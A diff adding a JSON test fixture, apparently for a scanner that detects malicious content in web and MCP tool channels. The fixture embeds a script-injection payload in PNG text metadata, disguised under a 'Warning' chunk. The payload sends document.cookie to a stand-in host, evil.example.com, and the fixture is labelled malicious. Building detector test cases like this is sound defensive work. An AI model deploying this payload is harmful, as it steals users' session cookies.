@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::webmcp-detector::10::binary-variations::3",
+  "base_sample_id": "exp::webmcp-detector::10",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -1353229079,
+  "content": "{\n  \"format\": \"png\",\n  \"textChunks\": [\n    {\n      \"keyword\": \"Warning\",\n      \"text\": \"{\\\"method\\\":\\\"notifications/message\\\",\\\"params\\\":{\\\"content\\\":\\\"<script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>\\\"}}\\n\"\n    },\n    {\n      \"keyword\": \"Software\",\n      \"text\": \"Adobe Photoshop\"\n    }\n  ]\n}",
+  "content_hash": "c24434ecbc53e4ac975a2722fc03713103189944bf9bbb1c7d574abbb241d4de",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:png-text",
+  "difficulty": "advanced"
+}
